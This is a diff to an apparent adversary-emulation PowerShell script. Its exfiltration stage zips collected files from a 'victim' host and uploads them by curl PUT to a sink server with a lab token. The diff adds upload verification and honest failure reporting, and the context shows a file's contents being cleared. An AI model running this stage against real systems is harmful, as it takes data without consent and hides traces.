@@ -5,6 +5,7 @@
 $RunId    = "__RUN_ID__"
 $SinkBase = "__SINK_BASE__"
 $VictimHost = "__HOST__"
+$SinkToken = "__SINK_TOKEN__"   # shared lab credential; the sink rejects uploads without it
 
 $wd = "C:\Windows\Temp\wdmp"
 $zp = "C:\Windows\Temp\wdmp.zip"
@@ -110,20 +111,51 @@ $zipHash = (Get-FileHash -Path $zp -Algorithm SHA256).Hash
 "ZIP_SHA256: $zipHash" | Out-File "$wd\_manifest.txt" -Encoding UTF8 -Append
 
 # --- S6 transfer to the internal sink ------------------------------------------------
+# Each upload is checked SEPARATELY: $LASTEXITCODE is captured right after its own
+# curl call, and the receipt is fetched back and verified (run, host, file name, size,
+# sha256) before the stage is reported as OK. A failed upload or a receipt mismatch
+# fails the stage instead of silently proceeding.
 $zipInfo = Get-Item $zp
+$transferOk = $false
+$upErr = $null
 if ($zipInfo.Length -gt 0 -and $zipInfo.Length -le 50 * 1024 * 1024) {
     $upUrl = "$SinkBase/artifacts/$RunId/ART-07-01/wdmp.zip"
-    $curlOut = curl.exe -s -X PUT -H "X-WMI-Host: $VictimHost" -T $zp $upUrl 2>&1
+    $null = curl.exe -s -X PUT -H "X-WMI-Host: $VictimHost" -H "X-LAB-Token: $SinkToken" -T $zp $upUrl 2>&1
+    $upCode = $LASTEXITCODE
+
     $manUrl = "$SinkBase/artifacts/$RunId/ART-06-01/_manifest.txt"
-    $null = curl.exe -s -X PUT --data-binary "@$wd\_manifest.txt" $manUrl 2>&1
-    $ok = $true
-    if ($LASTEXITCODE -ne 0) { $ok = $false }
+    $null = curl.exe -s -X PUT -H "X-LAB-Token: $SinkToken" --data-binary "@$wd\_manifest.txt" $manUrl 2>&1
+    $manCode = $LASTEXITCODE
+
+    if ($upCode -ne 0 -or $manCode -ne 0) {
+        $upErr = "upload exit codes zip=$upCode manifest=$manCode"
+    } else {
+        # fetch the receipt back and verify it against the local zip
+        $rcvUrl = "$SinkBase/receipt/$RunId"
+        try {
+            $receipt = Invoke-RestMethod -Uri $rcvUrl -Method Get -Headers @{ "X-LAB-Token" = $SinkToken } -ErrorAction Stop
+            $rf = $receipt.payload.sink_files | Where-Object { $_.name -eq "wdmp.zip" }
+            if ($receipt.payload.run_id -eq $RunId -and
+                $receipt.payload.host -eq $VictimHost -and
+                $rf -and $rf.size -eq $zipInfo.Length -and
+                $rf.sha256 -eq $zipHash) {
+                $transferOk = $true
+            } else {
+                $upErr = "receipt mismatch (run/host/size/hash)"
+            }
+        } catch {
+            $upErr = "receipt fetch failed: $_"
+        }
+    }
+} else {
+    $upErr = "archive empty or over size guard (no upload attempted)"
 }
 
-# status message to the sink (PowerShell channel; matches C4/C5 network stage)
+# status message to the sink (PowerShell channel; status is NOT a transfer claim)
 $summary = @{
     run = $RunId; host = $VictimHost; stage = "S6"; level = "info"
     files = $files.Count; zip = $zipInfo.Length; zip_sha256 = $zipHash
+    transfer_ok = $transferOk; transfer_error = $upErr
 } | ConvertTo-Json -Compress
 try { Invoke-RestMethod -Uri "$SinkBase/status/$RunId" -Method Post -ContentType "application/json" -Body $summary -ErrorAction SilentlyContinue } catch {}
 
@@ -135,4 +167,4 @@ try {
     if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue }
 } catch {}
 
-exit 0
+exit $(if ($transferOk) { 0 } else { 2 })
